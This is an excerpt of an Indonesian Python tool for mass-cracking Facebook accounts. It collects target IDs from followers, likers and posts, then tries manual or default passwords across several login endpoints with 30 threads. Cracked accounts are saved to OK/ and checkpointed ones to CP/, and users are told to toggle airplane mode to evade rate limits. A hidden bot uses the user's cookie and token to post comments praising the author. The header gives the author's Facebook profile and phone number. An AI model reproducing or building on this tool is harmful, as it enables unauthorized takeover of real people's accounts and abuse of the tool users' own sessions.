...
# ------ [ INFO ] ------ #
Pengarang     =  'Basari-ID'
Facebook   =  'Facebook.com/basari.shp'
Whatsapp   =  '08976622679'
Basari   =  100051967952842
...
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Asep)];self.komen = ['Mantap bang','Semoga langgeng bang sama si Syafaa','Ganteng banget💕','GG SC LU BANG']
    ...
    def get_folls(self,id,cookie): # --- [ Bot ] --- #
        with requests.Session() as xyz:
            try:
    ...
    def get_likers(self,url,cookie): # --- [ Bot ] --- #
        with requests.Session() as xyz:
            try:
    ...
    def get_posts(self,id,cookie,token): # --- [ Bot ] --- #
        with requests.Session() as xyz:
            try:
...
def menu():
	os.system('clear')
	jalan("[]MASUKKAN USERNAME SAMA PASSWORD\n")
	username = input("[] USERNAME \033[1;91m: \033[1;92m")
	password = input("[] PASSWORD \033[1;91m: \033[1;92m")
	if username =="BAZ" and password =="GG":
		print("[] LOGIN BERASIL")
		time.sleep(1)
		login()
	else:
		jalan("[] LOGIN GAGAL!!!")
		jalan("ANDA AKAN DI ARAHAN KE FB UNTUK MINTA USERNAME SAMA PASSWORD")
...
def log_cookie():
    ...
    banner()
    mkdir_data_login()
    jalan(f"{P}[•] JANGAN MENGGUNAKAN AKUN PRIBADI [•]")
    jalan(f"{P}[•] DISARANKAN PAKE AKUN BARU [•]")
...
komtwol = random.choice(['ANJAY BAS GANTENG ', 'Alfyu Bang ', 'BANH KOK LO JAGO BANGET SIH ', 'BANG DAH MAKAN BLM'])
kartu2d = random.choice(["LU GANTENG BANG TAPI SAYANG KEK HENGKER", "MAAF BANG GUA MAU RECODE SC LU"])
kon = random.choice(["AMPUN BANG GUA NYERAH SAJA :"])
def ___bas___Sayang___Kamu___faa___():
    try:
...
def login():
    ...
    jalan("\x1b[1;97mCoded By  : \x1b[1;92mBasari \x1b[1;97m& \x1b[1;92mSyafa")
    jalan(f"{P}=================================================")
...
def massal():
    ...
    try:
        print(f"{B}[•] Berapa ID Yang Ingin Anda Crack")
        tanya_total = int(input(f"{B}[•] Masukkan Jumlah ID : {P}"))
    except:tanya_total=1
    for t in range(tanya_total):
        t +=1
        _id_=input(f"{B}[•] Masukkan ID Target {P}{t} : {P}")
        try:
...
def fii_xd():
	...
	if fiisayangwidiya in [""]:
		...
		print(f"{B}[•] Tampilkan Opsi Akun Check Point {B}Y/t")
		...
		print(f"{B}[=_=] Tampilkan Opsi Chekpoint {B}Y/T")
		print(f"{B}[=_=]{M} terkadang jika menampilkan opsi jarang dapet akun !!!")
		...
		if _checkoptions_ in ["y","Y"]:
			...
			print(f"{B}[•] Crack Menggunakan Password Manual/Defaults {B}M/D")
			ter =input(f"{B}[•] Pilih : {P}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
...
def kone():
    print(f"{B}[1] B-api > {P}CEPAT")
    print(f"{B}[2] Mbasic > {P}KALEM")
    print(f"{B}[3] Mobile > {P}LAMBAT")

def started():
    print(f"{B}================================================={P}")
    jalan(f"{B}[•]{P} Results {H}OK {P}tersimpan di {H}OK/{tanggal}")
    jalan(f"{B}[•]{P} Results {K}CP {P}tersimpan di {K}CP/{tanggal}")
    jalan(f"{B}[•] Mainkan Mode Pesawat Jika Tidak Ada Hasil")
    jalan(f"{B}[•] Butuh kesabaran Crack nya lambat Yha Ngab")
    print(f"{B}================================================={P}")
